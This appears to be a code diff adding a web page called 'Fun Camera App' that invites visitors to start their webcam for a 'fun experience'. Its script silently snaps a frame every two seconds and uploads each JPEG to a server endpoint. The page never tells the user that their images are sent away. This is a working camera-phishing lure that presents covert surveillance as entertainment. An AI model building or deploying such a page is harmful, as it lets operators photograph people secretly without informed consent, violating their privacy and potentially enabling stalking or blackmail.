@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fun Camera App</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+        button {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 25px;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: all 0.3s;
+        }
+        button:hover {
+            background: #ff5252;
+            transform: scale(1.05);
+        }
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        #video {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 10px;
+            border: 3px solid white;
+        }
+        .status {
+            margin: 20px 0;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .capturing {
+            background: rgba(76, 175, 80, 0.3);
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎥 Fun Camera Experience</h1>
+        <p>Click "Start Camera" to begin the fun experience!</p>
+        
+        <button id="startButton" onclick="startCamera()">Start Camera</button>
+        
+        <div id="videoContainer" style="display: none;">
+            <video id="video" autoplay playsinline></video>
+            <div id="status" class="status"></div>
+            <p>Camera is active! Have fun! 😊</p>
+        </div>
+    </div>
+
+    <script>
+        let video = document.getElementById('video');
+        let startButton = document.getElementById('startButton');
+        let videoContainer = document.getElementById('videoContainer');
+        let statusDiv = document.getElementById('status');
+        let captureInterval;
+        let stream = null;
+
+        function startCamera() {
+            // Request camera access
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                } 
+            })
+            .then(function(mediaStream) {
+                stream = mediaStream;
+                video.srcObject = mediaStream;
+                videoContainer.style.display = 'block';
+                startButton.disabled = true;
+                startButton.textContent = 'Camera Active 🎥';
+                
+                statusDiv.textContent = 'Camera started successfully!';
+                statusDiv.className = 'status capturing';
+                
+                // Start capturing every 2 seconds
+                captureInterval = setInterval(captureImage, 2000);
+                
+                // Capture first image immediately
+                setTimeout(captureImage, 1000);
+                
+            })
+            .catch(function(err) {
+                console.error('Error accessing camera:', err);
+                statusDiv.textContent = 'Error: Could not access camera. Please allow camera permissions.';
+                statusDiv.style.background = 'rgba(244, 67, 54, 0.3)';
+            });
+        }
+
+        function captureImage() {
+            if (!stream) return;
+            
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            
+            // Set canvas dimensions to match video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Draw current video frame to canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to blob and send to server
+            canvas.toBlob(function(blob) {
+                sendToServer(blob);
+            }, 'image/jpeg', 0.8);
+        }
+
+        function sendToServer(blob) {
+            const formData = new FormData();
+            const timestamp = new Date().getTime();
+            const filename = `capture_${timestamp}.jpg`;
+            
+            formData.append('image', blob, filename);
+            
+            fetch('/upload', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Capture sent:', filename);
+                statusDiv.innerHTML = `📸 Capturing photos...<br><small>Last: ${new Date().toLocaleTimeString()}</small>`;
+            })
+            .catch(error => {
+                console.error('Error sending capture:', error);
+            });
+        }
+
+        // Stop capturing when page is closed
+        window.addEventListener('beforeunload', function() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+
+        // Add some fun messages
+        const messages = [
+            "Smile! You're looking great! 😊",
+            "Having fun with the camera! 📸",
+            "This is so much fun! 🎉",
+            "You're a natural! 🌟"
+        ];
+        
+        setInterval(() => {
+            if (stream) {
+                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+                console.log(randomMsg);
+            }
+        }, 10000);
+    </script>
+</body>
+</html>
